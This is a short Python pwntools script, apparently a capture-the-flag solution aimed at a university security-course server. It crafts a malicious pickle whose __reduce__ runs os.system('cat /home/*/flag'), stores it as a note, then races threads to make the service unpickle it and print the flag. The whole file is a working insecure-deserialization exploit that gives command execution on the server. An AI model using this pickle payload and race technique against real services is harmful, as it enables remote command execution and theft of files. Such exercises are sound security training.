from pwn import *
import pickle
import os
import time

HOST = "mustard.stt.rnl.tecnico.ulisboa.pt"
PORT = 25653

USER = "user"
NOTE_NAME = "autopwn"

class LeakFlag:
    def __reduce__(self):
        # Different formatting, but same effect
        cmd = "cat /home/*/flag"
        return (os.system, (cmd,))


def generate_pickle():
    return pickle.dumps(LeakFlag())

def write_note():
    io = remote(HOST, PORT)

    io.sendlineafter("Username", USER)

    io.sendlineafter(">>>", "1")     # FREE mode
    io.sendlineafter(">>>", "1")     # Write

    io.sendlineafter("note_name", NOTE_NAME)
    io.sendlineafter("note_content", generate_pickle())
    io.sendline(b'')  # Empty line to finish
    io.sendline(b'')
    io.close()

def read_note():
    io = remote(HOST, PORT)

    io.sendlineafter("Username", USER)

    io.sendlineafter(">>>", "0")     # CLASSY mode → loads pickle
    io.sendlineafter(">>>", "0")     # Read note

    io.sendlineafter("note_name", NOTE_NAME)

    # Pickle executes here; capture output
    data = io.recvall(timeout=2).decode(errors="ignore")
    return data

while True:
    threading.Thread(target=write_note).start()
    time.sleep(0.03)       # small delay makes race reliable

    out = read_note()

    if "SSof{" in out:
        print(out)
        break
